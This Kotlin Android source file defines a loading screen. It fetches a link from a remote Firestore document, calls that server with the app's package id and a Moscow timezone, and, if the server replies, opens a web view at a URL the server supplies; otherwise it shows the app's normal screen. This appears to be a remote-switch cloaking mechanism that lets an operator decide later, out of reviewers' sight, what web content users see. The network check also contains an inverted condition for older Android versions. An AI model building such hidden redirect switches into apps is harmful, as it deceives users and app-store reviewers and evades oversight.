package com.template

import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.View
import android.widget.ProgressBar
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.analytics.ktx.analytics
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import okhttp3.*
import okio.use
import java.io.IOException
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.text.DateFormat
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.Executors


class LoadingActivity : AppCompatActivity() {

    private lateinit var analytics: FirebaseAnalytics

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_loading)
        analytics = Firebase.analytics
        if (!isNetworkConnected()) {
            openMainActivity()
        } else {
//            val link = makingLink("https://youtube.com")
//            connectionToServer(link)
            val progressBar: ProgressBar = findViewById(R.id.progressBar)
            progressBar.visibility = View.VISIBLE

            val db = Firebase.firestore
            db.collection("database").document("check")
                .get()
                .addOnSuccessListener {
                      Log.d("nn97", "обращение к фб")
                        val local = it.get("link").toString()
                      Log.d("nn97", "$local то, что получили из файрбэйза")
                        if (local.equals("")) {
                            openMainActivity()
                        } else {
                            val link = makingLink(local)
                            Log.d("nn97", "$link с телефона обращаемся к этому серверу, сайту")
                           connectionToServer(link)
                       }
               }
        }
    }

    private fun makingLink(domain: String): String {

        return   "$domain/?packageid=$packageName&getz=Europe/Moscow&getr=utm_source=google-play&utm_medium=organic"
        //domain
    }

    private fun connectionToServer(link: String) {

        //синх запрос в новом потоке
        Thread {
          val client = OkHttpClient()
            val request :Request = Request.Builder().url(link).build()
            Log.d("nn97", "обращение к серваку")

            try {
                client.newCall(request).execute().use {
                    if (!it.isSuccessful){
                        //Запрос к серверу не был успешен
                        Log.d("nn97", "${it.code} ${it.message}")
                        openMainActivity()
                    }else{
                        Log.d("nn97", "200")
                        val urlForWebActivity = it.body!!.string()
                        val sharedPref =
                            this.getSharedPreferences("main",Context.MODE_PRIVATE) ?: return@Thread
                        with(sharedPref.edit()) {
                            putString(KEY, urlForWebActivity)
                            apply()
                        }
                        Log.d("nn97", "открывай веб")
                        openWebActivity()
                    }
                }
                //ошибка подключения
            } catch (e: IOException){
                println("Ошибка подключения: $e");
            }
        }.start()
    }

    private fun openMainActivity() {
        val intent = Intent(this, MainActivity::class.java)
        startActivity(intent)
    }

    private fun openWebActivity() {
        val intent = Intent(this, WebActivity::class.java)
        startActivity(intent)
    }

    companion object {
        private const val KEY = "urlForWeb"
    }

    private fun isNetworkConnected(): Boolean {
        var connected = true
        val connManager = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val networkCapabilities = connManager.getNetworkCapabilities(connManager.activeNetwork)
            if (networkCapabilities == null) {
                connected = false
            }
        } else {
            val activeNetwork = connManager.activeNetworkInfo
            if (activeNetwork?.isConnectedOrConnecting == true && activeNetwork.isAvailable) {
                connected = false
            }
        }
        return connected
    }
}